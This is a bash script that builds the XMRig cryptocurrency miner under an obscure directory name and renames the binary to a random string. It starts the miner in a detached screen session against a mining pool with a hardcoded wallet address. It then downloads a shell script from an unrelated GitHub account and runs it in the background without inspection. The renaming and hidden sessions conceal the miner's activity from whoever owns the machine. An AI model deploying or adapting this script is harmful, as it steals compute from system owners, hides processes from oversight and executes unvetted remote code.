#!/bin/bash
apt-get update
apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim
apt-get install -y cmake libuv1-dev libhwloc-dev cpulimit gawk
azure=mxsemsdnlkdj;
mkdir /usr/local
mkdir /usr/local/src
rm -r /usr/local/src/$azure
git clone https://github.com/xmrig/xmrig.git /usr/local/src/$azure
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/local/src/$azure
sysctl -w vm.nr_hugepages=128 
mkdir build
cd build
cmake ..
make
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10110 -u LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV -p az -a rx/loki -k
wget https://raw.githubusercontent.com/ts6aud5vkg/gpuissa/master/cpu_deamon.sh
chmod 755 cpu_deamon.sh
screen -d -m ./cpu_deamon.sh
